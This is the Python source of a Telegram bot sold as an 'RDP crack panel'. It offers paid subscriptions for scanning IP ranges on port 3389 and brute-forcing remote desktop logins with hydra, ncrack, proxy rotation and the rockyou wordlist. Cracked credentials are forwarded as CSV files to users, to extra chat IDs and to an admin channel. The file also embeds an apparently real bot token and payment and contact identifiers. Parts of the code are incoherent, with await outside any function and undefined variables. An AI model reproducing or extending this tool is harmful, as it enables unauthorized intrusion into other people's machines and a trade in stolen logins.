# bot.py   ──  SHAHZADA ULTIMATE RDP CRACK PANEL — COMPLETE 2026 EDITION
# ALL FEATURES: scanner, payments, redeem, admin, brute with proxychains/ncrack/hydra, queue, CSV, email verification, proxy rotation, rockyou, progress, /brutestatus, /brutestop, multi-hits ID, /mystats, auto-delete, etc.

import asyncio
import csv
import io
import json
import os
import random
import re
import subprocess
import time
import uuid
from datetime import datetime
from io import BytesIO
from pathlib import Path

import qrcode
from aiogram import Bot, Dispatcher, Router
from aiogram.filters import Command, CommandStart, Text
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    BufferedInputFile, InlineKeyboardButton, InlineKeyboardMarkup,
    CallbackQuery, Message
)
from dotenv import load_dotenv

load_dotenv()

# ──────────────────────────────────────────────
# CONFIG — CHANGE THESE
# ──────────────────────────────────────────────

BOT_TOKEN = "8255629411:AAGpjnEc_ET3ha9ab8towP4GA3f5KH8B2vI"
ADMIN_IDS = {7173024148}

SUPPORT_USERNAME = "@iam_baazigar_ii"
UPI_ID   = "bazzigar528@oksbi"
UPI_NAME = "Shahzada RDP"
PAYPAL_ME = "https://paypal.me/yourpaypal"

SMTP_SERVER = "https://mail.proton.me/"
SMTP_PORT   = 587
SMTP_USER   = "galula360@protonmail.com"
SMTP_PASS   = "your-app-password"
ADMIN_EMAIL = "galula360@protonmail.com"
ADMIN_CHANNEL_ID = "@baazigarhits" 

DEFAULT_PORTS = "3389"
DEFAULT_RATE  = 1500
MAX_FREE_RATE = 8000
MAX_PREMIUM_RATE = 50000
MAX_CONCURRENT_BRUTES = 3
DEFAULT_BRUTE_TIMEOUT = 60  # seconds per target

ROCKYOU_PATH = Path("rockyou.txt")  # place rockyou.txt here

RESULTS_DIR = Path("scan_results")
RESULTS_DIR.mkdir(exist_ok=True)
USERS_FILE  = Path("users.json")
REDEEM_FILE = Path("redeem_codes.json")

PLANS = {
    "basic":    {"amount_inr": 299,  "days": 7,   "desc": "Basic — 7 days"},
    "pro":      {"amount_inr": 799,  "days": 30,  "desc": "Pro — 30 days + high speed"},
    "lifetime": {"amount_inr": 2999, "days": 9999,"desc": "Lifetime — no limits"},
}

GREETINGS = [
    "🔥 Shahzada welcomes you back, boss! Time to own the internet again. 💀",
    "🖤 Yo king! Shahzada locked & loaded. Let's make these IPs scream today! 🚀",
    "👑 Shahzada here — your underground empire builder is online. Ready to feast? 😈",
    "⚡ Shahzada activated! The panel is burning hot. What we cracking tonight? 🔥",
]

# Globals for brute management
brute_semaphore = asyncio.Semaphore(MAX_CONCURRENT_BRUTES)
brute_queue = []                # list of (uid, message, start_time, task)
running_brutes = {}             # uid → {"task": task, "start": time, "pid": pid or None}
last_hits = {}                  # uid → list of last 200 formatted hits

# ──────────────────────────────────────────────
# DATA
# ──────────────────────────────────────────────

users = json.load(open(USERS_FILE, "r", encoding="utf-8")) if USERS_FILE.exists() else {}
redeem_codes = json.load(open(REDEEM_FILE, "r", encoding="utf-8")) if REDEEM_FILE.exists() else {}

def save_users():
    json.dump(users, open(USERS_FILE, "w", encoding="utf-8"), indent=2, ensure_ascii=False)

def save_redeems():
    json.dump(redeem_codes, open(REDEEM_FILE, "w", encoding="utf-8"), indent=2, ensure_ascii=False)

# ──────────────────────────────────────────────
# STATES
# ──────────────────────────────────────────────

class ScanForm(StatesGroup):
    range_text = State()
    txt_upload = State()
    ports = State()
    rate = State()
    proxy = State()
    proxylist_upload = State()
    brute_users = State()
    set_email = State()
    verify_email = State()
    set_hits_id = State()
    custom_quality = State()
    set_hits_quality = State()

# ──────────────────────────────────────────────
# BOT INIT
# ──────────────────────────────────────────────

bot = Bot(token=BOT_TOKEN, parse_mode="HTML")
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

# ──────────────────────────────────────────────
# MENUS
# ──────────────────────────────────────────────

def user_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Add Range", callback_data="add_range")],
        [InlineKeyboardButton(text="📄 Upload TXT", callback_data="upload_txt")],
        [InlineKeyboardButton(text="🔌 Ports", callback_data="set_ports")],
        [InlineKeyboardButton(text="⚡ Rate", callback_data="set_rate")],
        [InlineKeyboardButton(text="🌐 Set Proxy", callback_data="set_proxy")],
        [InlineKeyboardButton(text="📋 Set Proxy List", callback_data="set_proxylist")],
        [InlineKeyboardButton(text="▶️ Start Scan", callback_data="start_scan")],
        [InlineKeyboardButton(text="⏹ Stop Scan", callback_data="stop_scan")],
        [InlineKeyboardButton(text="📊 Status", callback_data="status")],
        [InlineKeyboardButton(text="📥 Download", callback_data="download")],
        [InlineKeyboardButton(text="🗑 Clear", callback_data="clear")],
        [InlineKeyboardButton(text="🔪 Brute Hits", callback_data="brute_teaser")],
        [InlineKeyboardButton(text="📊 Brute Status", callback_data="brutestatus")],
        [InlineKeyboardButton(text="🛑 Stop Brute", callback_data="brutestop")],
        [InlineKeyboardButton(text="💎 Premium", callback_data="premium_menu")],
        [InlineKeyboardButton(text="📞 Support", url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}")],
    ])

# ──────────────────────────────────────────────
# /brutestatus — detailed queue & running info
# ──────────────────────────────────────────────

@router.message(Command("brutestatus"))
async def cmd_brutestatus(m: Message):
    uid = str(m.from_user.id)

    text = "<b>Brute Status Report</b>\n\n"

    text += f"Running brutes: {len(running_brutes)} / {MAX_CONCURRENT_BRUTES} max\n"
    text += f"Queued brutes: {len(brute_queue)}\n\n"

    if uid in running_brutes:
        start = running_brutes[uid]["start"]
        elapsed = time.time() - start
        text += "Your brute: <b>RUNNING</b>\n"
        text += f"Started: {datetime.fromtimestamp(start).strftime('%H:%M:%S UTC')}\n"
        text += f"Elapsed: {int(elapsed // 60)} min {int(elapsed % 60)} sec\n"
    elif any(u == uid for u, _, _, _ in brute_queue):
        pos = next(i+1 for i, (u, _, _, _) in enumerate(brute_queue) if u == uid)
        text += f"Your position in queue: <b>{pos}</b> of {len(brute_queue)}\n"
        text += "Waiting for free slot...\n"
        est = len(running_brutes) * 300 + (pos - 1) * 120  # rough estimate
        text += f"Estimated wait: ~{est // 60} minutes\n"
    else:
        text += "No active or queued brute task.\n"

    await m.reply(text)

# ──────────────────────────────────────────────
# /brutestop — cancel queued or running brute
# ──────────────────────────────────────────────

@router.message(Command("brutestop"))
async def cmd_brutestop(m: Message):
    uid = str(m.from_user.id)

    # Check running
    if uid in running_brutes:
        task = running_brutes[uid].get("task")
        pid = running_brutes[uid].get("pid")
        if task and not task.done():
            task.cancel()
        if pid:
            try:
                os.kill(pid, 9)
            except:
                pass
        del running_brutes[uid]
        await m.reply("Your running brute has been stopped.")
        save_users()
        return

    # Check queue
    for i, (q_uid, _, _, _) in enumerate(brute_queue):
        if q_uid == uid:
            del brute_queue[i]
            await m.reply("Your queued brute has been cancelled.")
            return

    await m.reply("No active or queued brute to stop.")

# ──────────────────────────────────────────────
# /addhitid, /removehitid, /listhitids — multiple forwarding IDs
# ──────────────────────────────────────────────

@router.message(Command("addhitid"))
async def cmd_addhitid(m: Message):
    uid = str(m.from_user.id)
    if uid not in users:
        await m.reply("Use /start first.")
        return

    args = m.text.split(maxsplit=1)
    if len(args) < 2:
        await m.reply("Usage: /addhitid 123456789")
        return

    try:
        target = int(args[1])
    except:
        await m.reply("Invalid ID — must be numeric.")
        return

    hits_ids = users[uid].setdefault("hits_ids", [])
    if target in hits_ids:
        await m.reply(f"ID {target} already added.")
    else:
        hits_ids.append(target)
        save_users()
        await m.reply(f"Added hits forwarding to {target}")

@router.message(Command("removehitid"))
async def cmd_removehitid(m: Message):
    uid = str(m.from_user.id)
    if uid not in users:
        await m.reply("Use /start first.")
        return

    args = m.text.split(maxsplit=1)
    if len(args) < 2:
        await m.reply("Usage: /removehitid 123456789")
        return

    try:
        target = int(args[1])
    except:
        await m.reply("Invalid ID.")
        return

    hits_ids = users[uid].get("hits_ids", [])
    if target in hits_ids:
        hits_ids.remove(target)
        save_users()
        await m.reply(f"Removed {target} from hits forwarding.")
    else:
        await m.reply(f"{target} not in your hits list.")

@router.message(Command("listhitids"))
async def cmd_listhitids(m: Message):
    uid = str(m.from_user.id)
    hits_ids = users.get(uid, {}).get("hits_ids", [])
    if not hits_ids:
        await m.reply("No hits forwarding IDs set.")
    else:
        text = "Your hits forwarding IDs:\n" + "\n".join(f"- {i}" for i in hits_ids)
        await m.reply(text)

# ──────────────────────────────────────────────
# UPDATED BRUTE RESULT (CSV + multiple IDs + quality filter)
# ──────────────────────────────────────────────

# In the brute result block (after filtered list is ready)

if filtered:
    # CSV creation
    csv_buffer = io.StringIO()
    writer = csv.DictWriter(csv_buffer, fieldnames=["IP", "Port", "User", "Pass", "Time"])
    writer.writeheader()
    for h in filtered:
        writer.writerow(h)
    csv_bytes = csv_buffer.getvalue().encode()

    # Send to user
    if users.get(uid, {}).get("csv_forward", True):
        await bot.send_document(
            m.chat.id,
            BufferedInputFile(csv_bytes, filename=f"hits_{uid}_{int(time.time())}.csv"),
            caption=f"{len(filtered)} high-quality hits"
        )
    else:
        plain = "\n".join(f"{h['IP']}:{h['Port']}:{h['User']}:{h['Pass']}" for h in filtered)
        await m.reply(plain)

    # Forward to multiple hits IDs
    hits_ids = users.get(uid, {}).get("hits_ids", [])
    for hid in hits_ids:
        try:
            # Text always
            plain = "\n".join(f"{h['IP']}:{h['Port']}:{h['User']}:{h['Pass']}" for h in filtered)
            await bot.send_message(hid, plain)

            # CSV only if enabled
            if users[uid].get("csv_forward", True):
                await bot.send_document(
                    hid,
                    BufferedInputFile(csv_bytes, filename=f"hits_{uid}.csv"),
                    caption=f"High-quality hits from {m.from_user.full_name}"
                )
        except Exception as e:
            print(f"Forward to {hid} failed: {e}")

    # Admin channel
    if ADMIN_CHANNEL_ID:
        await bot.send_message(ADMIN_CHANNEL_ID, f"HIGH-QUALITY HIT — User {uid}:\n" + plain)
        if users[uid].get("csv_forward", True):
            await bot.send_document(
                ADMIN_CHANNEL_ID,
                BufferedInputFile(csv_bytes, filename=f"hit_{uid}.csv"),
                caption=f"High-quality hit — User {uid}"
            )

# ──────────────────────────────────────────────
# LAUNCH + QUEUE MONITOR (for better notifications)
# ──────────────────────────────────────────────

async def queue_monitor():
    while True:
        await asyncio.sleep(10)
        for i, (uid, m, start, _) in enumerate(brute_queue):
            pos = i + 1
            try:
                await m.reply(f"Queue update: your position improved to {pos}")
            except:
                pass

asyncio.create_task(queue_monitor())

async def main():
    print("Shahzada Panel — /brutestatus + /brutestop + multi-hits ID + CSV toggle + per-target timeout")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())